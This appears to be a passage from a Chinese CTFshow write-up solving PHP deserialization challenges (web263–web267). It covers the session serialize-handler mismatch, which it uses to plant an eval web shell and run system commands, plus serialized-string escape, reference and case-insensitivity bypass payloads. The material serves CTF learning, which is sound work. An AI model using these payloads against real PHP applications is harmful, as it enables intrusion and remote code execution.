<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">inc.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">&quot;Asia/Shanghai&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">use</span> \<span class="title">CTFSHOW</span>\<span class="title">CTFSHOW</span>; </span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;CTFSHOW.php&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> CTFSHOW([</span><br><span class="line">    <span class="string">&#x27;database_type&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;database_name&#x27;</span> =&gt; <span class="string">&#x27;web&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;server&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;port&#x27;</span> =&gt; <span class="number">3306</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;option&#x27;</span> =&gt; [</span><br><span class="line">        PDO::ATTR_CASE =&gt; PDO::CASE_NATURAL</span><br><span class="line">    ]</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// sql注入检查</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$str</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\?/i&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">&quot;log-&quot;</span>.<span class="keyword">$this</span>-&gt;username, <span class="string">&quot;使用&quot;</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">&quot;登陆&quot;</span>.(<span class="keyword">$this</span>-&gt;status?<span class="string">&quot;成功&quot;</span>:<span class="string">&quot;失败&quot;</span>).<span class="string">&quot;----&quot;</span>.date_create()-&gt;format(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>check.php中包含了inc.php，在其中设置了session序列化引擎为php引擎，这样设置说明原本的默认引擎应该是php_serialize引擎，也就是在index.php中写入<code>$_SESSION[&#39;limit&#39;]</code>的就是php_serialize引擎：</p>
<p>不同的引擎所对应的session的存储方式不相同。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过<span class="built_in">serialize</span>()函数序列化处理的值</span><br><span class="line"></span><br><span class="line">php:存储方式是，键名+竖线+经过<span class="built_in">serialize</span>()函数序列处理的值</span><br><span class="line"></span><br><span class="line"><span class="built_in">php_serialize</span>(php&gt;<span class="number">5.5</span>.<span class="number">4</span>):存储方式是，经过<span class="built_in">serialize</span>()函数序列化处理的值 </span><br></pre></td></tr></table></figure>

<p>session 的目录在 /var/lib/php/sessions 中，如果我们执行下面的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>

<p>在 php_serialize 引擎下，会生成一个session文件，session文件中存储的数据为:</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;spoock&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>php 引擎下文件内容为:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:6:<span class="string">&quot;spoock&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>php_binary 引擎下文件内容为:</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">names:<span class="number">6</span>:<span class="string">&quot;spoock&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>PHP Session中的序列化危害</strong>：</p>
<p>如果在PHP反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样时，会导致数据无法正确的反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。如：</p>
<p>假如说有一个PHP文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;ryat&#x27;</span>] = <span class="string">&#x27;|O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:2:&quot;xx&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>访问后会生成一个session文件，文件内容为：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">a:</span><span class="number">1</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;ryat&quot;</span></span>;<span class="symbol">s:</span><span class="number">30</span><span class="symbol">:<span class="string">&quot;|O:1:&quot;</span>A<span class="string">&quot;:1:&#123;s:1:&quot;</span>a<span class="string">&quot;;s:2:&quot;</span>xx<span class="string">&quot;;&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>但如果此时在其他页面使用php引擎来读取session文件时</p>
<p>访问该页面会输出：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>(A)<span class="meta">#1 (1) &#123;</span></span><br><span class="line">  [<span class="meta"><span class="meta-string">&quot;a&quot;</span></span>]=&gt;</span><br><span class="line">  <span class="built_in">string</span>(<span class="number">2</span>) <span class="string">&quot;xx&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line">这是因为当使用php引擎的时候，php引擎会以|作为作为key和<span class="keyword">value</span>的分隔符，那么就会将 a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;ryat&quot;</span>;s:<span class="number">30</span>:<span class="string">&quot; 作为SESSION的key，将 O:1:&quot;</span>A<span class="string">&quot;:1:&#123;s:1:&quot;</span>a<span class="string">&quot;;s:2:&quot;</span>xx<span class="string">&quot;;&#125; 作为value，然后进行反序列化，最后就会得到A这个类。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。漏洞在加载使用php引擎的页面时session去读session中的内容并反序列化导致漏洞触发，不需要任何输出</span></span><br></pre></td></tr></table></figure>

<p><strong>漏洞在加载使用php引擎的页面时session去读session中的内容并反序列化导致漏洞触发，不需要任何输出</strong>，<strong>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 session_set_save_handler() 设定的用户自定义会话管理器。 通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储），PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</strong></p>
<p>我们要利用的肯定是inc.php文件中的file_put_contents函数</p>
<p>将一句话写进去</p>
<p>先说一下思路：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">第一步</span><br><span class="line">肯定是先看index.php文件（这个文件用的是php_serialize引擎），先看这句话：</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limti&#x27;</span>]&gt;5?die(<span class="string">&quot;登陆失败次数超过限制&quot;</span>):<span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);</span><br><span class="line">这句话肯定是不成立的，因为session里没有limti,所以这句话恒不成立，只会执行后面这一句</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;limit&#x27;</span>]=base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]);  赋值后不变了，下面只是改变cookie</span><br><span class="line">下面这一句话：<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>]) +1);</span><br><span class="line">只是对<span class="variable">$_COOKIE</span>[<span class="string">&#x27;limit&#x27;</span>])进行覆盖，不用管</span><br><span class="line">所以我们需要传入经过base64加密的<span class="built_in">limit</span>的cookie值</span><br><span class="line">再看check.php文件：</span><br><span class="line">require_once <span class="string">&#x27;inc/inc.php&#x27;</span>;</span><br><span class="line">他会调用inc.php中的ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">所以check.php用的是php引擎</span><br><span class="line"><span class="variable">$GET</span> = array(<span class="string">&quot;u&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="string">&quot;pass&quot;</span>=&gt;<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">需要get传入u变量和pass变量</span><br><span class="line">最后看inc.php文件：</span><br><span class="line">该文件用的是php引擎</span><br><span class="line">这里面有一个User类（class User），就这一个类，肯定是要用的</span><br><span class="line">最重要的是，要利用file_put_contents()函数</span><br><span class="line">注意：传入一句话后，访问时1.php时要加上<span class="built_in">log</span>-头</span><br></pre></td></tr></table></figure>

<p>构造链子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setStatus</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;status=<span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="string">&#x27;1.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;|&#x27;</span>.serialize(<span class="variable">$user</span>));</span><br><span class="line"></span><br><span class="line">output：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;1.php&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">34</span>:<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[1]);phpinfo();?&gt;&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;status&quot;</span>;N;&#125;</span><br><span class="line"></span><br><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">加了一个phpinfo();好像是因为内部编码问题对后面的符号有影响</span><br></pre></td></tr></table></figure>

<p>具体实操：</p>
<p>先访问index.php,修改limit的cookie为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321211220453.png" alt="image-20220321211220453"></p>
<p>execute</p>
<p>写进去之后，这样session文件中就写入了我们需要的内容,访问check.php?u=123&amp;pass=123。因为包含了inc.php，inc.php中又改变了session引擎，进而反序列化出一个User类的实例，而这个实例在销毁的时候调用了<code>--destruct()</code>方法，进而达成了写shell的目的。</p>
<p>execute</p>
<p>最后访问log-1.php,成功rce</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post；</span><br><span class="line"><span class="number">1</span>=<span class="keyword">system</span>(<span class="string">&#x27;tac f*.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321211327444.png" alt="image-20220321211327444"></p>
<h3 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321214159629.png" alt="image-20220321214159629"></p>
<p>和262类似，逃逸</p>
<p>有个message.php<img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321214256472.png" alt="image-20220321214256472"></p>
<p>需要token等于admin</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>=<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$msg</span>=serialize(<span class="keyword">new</span> message);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span>=O:<span class="number">7</span>:<span class="string">&quot;message&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;from&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;msg&quot;</span>;i:<span class="number">2</span>;s:<span class="number">2</span>:<span class="string">&quot;to&quot;</span>;s:<span class="number">135</span>:<span class="string">&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:4:&quot;</span>user<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>在message.php还有一个条件：<img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321215847621.png" alt="image-20220321215847621"></p>
<p>需要添加一个msg的cookie。</p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">f</span>=1&amp;m=2&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br><span class="line">添加cookie：<span class="attribute">msg</span>=1  随便什么值都可以。</span><br></pre></td></tr></table></figure>

<h3 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321221734839.png" alt="image-20220321221734839"></p>
<p>md5(mt_rand())预测不了，所以考虑引用，将password赋值为token的引用，只要<code>$this-&gt;password</code>与<code>$this-&gt;token</code>指向同一块地址空间，那么无论后者的值怎么变，两者都相等。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = &amp;<span class="keyword">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ctfshowAdmin());</span><br></pre></td></tr></table></figure>

<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">payload</span>：</span><br><span class="line"><span class="operator">?</span><span class="variable">ctfshow</span><span class="operator">=</span><span class="built_in">O</span><span class="operator">:</span><span class="number">12</span><span class="operator">:</span><span class="string">&quot;ctfshowAdmin&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">5</span><span class="operator">:</span><span class="string">&quot;token&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">8</span><span class="operator">:</span><span class="string">&quot;password&quot;</span><span class="operator">;</span><span class="variable">R</span><span class="operator">:</span><span class="number">2</span><span class="operator">;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321224659168.png" alt="image-20220321224659168"></p>
<p>发现，反序列话的是<code>$cs=file_get_contnets(php://input)</code>，同时在<code>__destruct</code>中有输出flag的语句。暗示了要找个机会传入一个ctfshow类进去。恰好看到<code>$cs</code>对字符串ctfshow过滤了，也就明示了要传入ctfshow类的字符串给cs。这题就差把flag顺手给提交了。</p>
<p>php://input伪协议是post输入的参数。首先拿到一个ctfshow类的反序列化字符串；会对序列化的内容做过滤，不能包含<code>ctfshow</code>。但是，PHP有一个特性：函数名和类名不区分大小写，变量名区分。所以可以改为<code>Ctfshow</code>即可。脚本如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> Ctfshow();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$user</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;Ctfshow&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;ctfshow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>利用burp传值；在hackbar中，post不能传入单个字符串，必须是以<code>a=b</code>形式传入，只传入<code>b</code>是不行的，所以要利用到burp，抓包，改值。</p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321225547602.png" alt="image-20220321225547602"></p>
<p>破坏结构进行析构</p>
<p>就是说，传入一个破坏了反序列化字符串结构的字符串进去，使得，即使异常了，也会析构。</p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321225804531.png" alt="image-20220321225804531"></p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220321225902639.png" alt="image-20220321225902639"></p>
<h3 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220322151634165.png" alt="image-20220322151634165"></p>
<p>弱密码admin，admin登录成功</p>
<p>about页面下，查看源码：有个提示：<img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220322151906774.png" alt="image-20220322151906774"></p>
<p>url后面加view-source查看到如下页面</p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220322152010937.png" alt="image-20220322152010937"></p>
